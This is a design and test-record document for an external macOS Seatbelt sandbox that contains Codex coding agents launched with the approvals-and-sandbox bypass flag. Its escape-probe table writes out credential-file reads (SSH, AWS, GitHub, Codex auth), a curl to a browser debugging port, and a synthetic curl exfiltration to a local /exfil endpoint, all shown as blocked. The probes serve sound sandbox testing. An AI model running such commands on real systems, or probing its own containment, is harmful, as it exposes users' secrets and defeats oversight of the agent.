# Codex external sandbox backend

This document records the external operating-system cage Firstmate applies to every Codex crewmate, scout, and secondmate launch.
`bin/fm-spawn.sh` owns the launch templates, `bin/fm-codex-cage.sh` owns validation and environment construction, and `bin/fm-codex-cage.sb` owns the macOS Seatbelt policy.

## Current posture

Both Codex launch templates run this shape:

```text
bin/fm-codex-cage.sh \
  --worktree <isolated-worktree> \
  --task-data-dir <firstmate-home>/data/<id> \
  --status-path <firstmate-home>/state/<id>.status \
  --notify-path <firstmate-home>/state/<id>.turn-ended \
  --fm-home <firstmate-home> \
  -- codex --dangerously-bypass-approvals-and-sandbox ...
```

The secondmate form omits `--notify-path` because its persistent lifecycle does not use the ordinary Codex turn-end notification.
The secondmate home is itself the isolated worktree, while its parent receives access only to the exact status path.
The former `--sandbox workspace-write --ask-for-approval never -c sandbox_workspace_write.network_access=true` interim is not present in either spawn path.

The Codex bypass flag is safe here only because the whole Codex process tree is already inside a fail-closed external Seatbelt cage.
The cage is a second layer, not a licence.
A passing probe set proves that the paths anticipated by those probes are blocked, but it cannot prove that no sandbox escape exists.
The rule that no agent ever touches the captain's personal browser is permanent and independent of this cage.
The browser rule is not relaxed by a passing cage test or by any autonomy posture.

## Cage boundary

The wrapper refuses to launch unless it is running on macOS with `sandbox-exec`, the profile, the public CA bundle, Command Line Tools, a genuine Git worktree, and a resolvable Codex native binary.
The environment is rebuilt from a non-secret allowlist rather than inherited from the captain's shell.
`DEVELOPER_DIR` is pinned to `/Library/Developer/CommandLineTools`, which is already readable inside the cage, so `xcrun` never needs the denied `/Applications/Xcode.app` tree.
`SSL_CERT_FILE` is pinned to `/private/etc/ssl/cert.pem`, and only the system TLS trust directory is opened for reads.

Seatbelt denies by default and then grants these task capabilities:

- System runtimes, developer tools, the Codex installation, the task worktree, its Git metadata, the exact task data directory, exact lifecycle files, and the cage's private temporary directory are readable.
- Only the signed native Codex process can read and write `CODEX_HOME`, so Codex can authenticate while model-launched shells cannot read its credential store.
- Writes are limited to the task worktree, its Git metadata, `data/<id>`, the exact `state/<id>.status`, the exact turn-end file, and the cage's private temporary directory.
- Outbound internet access remains available for Codex and public Git operations.
- Every loopback TCP destination is denied, including already-running Chrome remote-debugging ports.
- Apple events, executable access below application bundles, LaunchServices, and account or credential brokers remain denied.
- A cage-local `gh` compatibility command supports only credential-free `gh repo clone OWNER/REPO`; authenticated GitHub CLI operations are rejected.

The profile deliberately denies `/Applications` and `/System/Applications`.
Do not open those trees to fix a tool lookup or browser compatibility issue.

## Kun posture and public-cage investigation

The investigation used `gh` CLI clones and local Git inspection rather than a browser.

- [`kunchenguid/firstmate` `bin/fm-spawn.sh` at commit `10ee7797e50c88c9865d8fb382cdfee5c2b8bcd1`](https://github.com/kunchenguid/firstmate/blob/10ee7797e50c88c9865d8fb382cdfee5c2b8bcd1/bin/fm-spawn.sh) launches both Codex forms with `--dangerously-bypass-approvals-and-sandbox`.
- The most recent public commit touching that file in the inspected history is [`3eca8ff0129792c97e933616f2d72ec5801679f1`](https://github.com/kunchenguid/firstmate/commit/3eca8ff0129792c97e933616f2d72ec5801679f1).
- [`kunchenguid/no-mistakes` `internal/agent/codex.go` at commit `88dc204f933bbccee5fd144f2fa1e74cb52704c2`](https://github.com/kunchenguid/no-mistakes/blob/88dc204f933bbccee5fd144f2fa1e74cb52704c2/internal/agent/codex.go) uses the same bypass default unless a caller provides sandbox flags.
- No fetchable cage implementation was present in Kun's inspected public Firstmate, no-mistakes, Treehouse, or dotfiles repositories.

Firstmate therefore matches Kun's public Codex posture and supplies the closest standard macOS implementation for the missing external layer: a deny-first `sandbox-exec` Seatbelt profile.

## Live acceptance evidence

- Date: 2026-07-24.
- Host: macOS 26.5.2.
- Codex: `codex-cli 0.145.0`.
- Git: `git version 2.50.1 (Apple Git-155)`.
- Ambient developer directory: `/Applications/Xcode.app/Contents/Developer`.
- Caged developer directory: `/Library/Developer/CommandLineTools`.

The exact acceptance invocation was:

```sh
FM_CODEX_CAGE_LIVE_E2E=1 tests/fm-codex-cage-live-e2e.test.sh
```

The live test launched `codex exec --dangerously-bypass-approvals-and-sandbox` through `bin/fm-codex-cage.sh`.
Its exact final output and exit were:

```text
ok - bypass-mode Codex is externally caged while task work, GitHub, main-home status/report delivery, and turn-end remain available
exit=0
```

### Escape probes

The generated probe script issued these commands from the model-launched shell:

| Probe | Command |
|---|---|
| Browser loopback | `/usr/bin/curl --connect-timeout 2 --fail --silent --show-error http://127.0.0.1:<live-port>/json/version` |
| SSH home | `/bin/ls "$HOME/.ssh"` |
| Config home | `/bin/ls "$HOME/.config"` |
| AWS home | `/usr/bin/head -c 1 <existing-synthetic-home>/.aws/credentials` |
| Shell startup | `/usr/bin/head -c 1 "$HOME/.zshrc"` |
| Codex credential | `/usr/bin/head -c 1 "$HOME/.codex/auth.json"` |
| GitHub credential | `/usr/bin/head -c 1 "$HOME/.config/gh/hosts.yml"` |
| Inherited secret | `/usr/bin/printenv FM_CAGE_TEST_SECRET` |
| Synthetic exfiltration | `head -c 1 <readable-worktree-sentinel> >/dev/null; printf 'payload-read-ok '; curl --data-binary @<readable-worktree-sentinel> http://127.0.0.1:<live-port>/exfil` |

Run 6 produced this exact probe evidence:

```text
browser-loopback  exit=7  refused, against a server proven live before AND after the run
home-ssh          exit=1  Operation not permitted
home-config       exit=1  Operation not permitted
home-aws          exit=1  Operation not permitted
home-shell-rc     exit=1  Operation not permitted
codex-credential  exit=1  Operation not permitted
gh-credential     exit=1  Operation not permitted
inherited-secret  exit=1  (empty)
synthetic-exfil   exit=7  payload-read-ok, then refused at the network layer
```

The AWS probe targeted an existing synthetic credential file, so its result was an operating-system denial rather than an absent-path error.
The exfiltration probe printed `payload-read-ok` before `curl`, proving the payload was readable before the network denial.
The synthetic browser endpoint returned `ready` before and after the cage run.
Its server log contained only the two external `/health` requests and no request from the caged process.

### Work controls

The generated probe script also issued these legitimate task commands:

| Control | Command |
|---|---|
| Worktree write | `printf cage-ok > worktree.txt && cat worktree.txt` |
| Shell pipeline | `printf 'alpha\nbeta\n' \| grep beta` |
| Public GitHub clone | `gh repo clone octocat/Hello-World gh-clone -- --depth=1 && test -d gh-clone/.git` |
| Main-home status | `printf 'working: cage acceptance\n' \| tee -a <firstmate-home>/state/cage-acceptance.status` |
| Main-home report | `printf '# Cage report\n\nDelivered from caged Codex.\n' \| tee <firstmate-home>/data/cage-acceptance/report.md` |

Run 6 produced this exact control evidence:

```text
worktree-write     exit=0  cage-ok
shell-pipeline     exit=0  beta
github-clone       exit=0  Cloning into 'gh-clone'...
main-status-write  exit=0  working: cage acceptance
main-report-write  exit=0  # Cage report  Delivered from caged Codex.
```

The turn-end notification file was also created.
The GitHub clone emitted harmless `xcrun` cache warnings because the cage does not grant the system temporary directory as a write path.

## Interim evidence and incident context

Before the external cage, the interim Codex `workspace-write` posture blocked off-worktree writes and browser launch but retained full-disk reads and access to already-listening loopback ports.
It also blocked legitimate `state/<id>.status` and `data/<id>/report.md` writes in the main Firstmate home, which broke scout report delivery.
Those residuals are why the interim was removed only after the external live acceptance passed.

The original incident came from conflating the captain-approved `+yolo` decision-autonomy posture with Codex's sandbox-bypass flag.
`+yolo` governs routine decision authority and never authorizes access to the captain's personal browser.
The current design keeps that distinction explicit: Codex bypasses only its internal sandbox, the external cage remains mandatory, and the browser rule remains permanent.
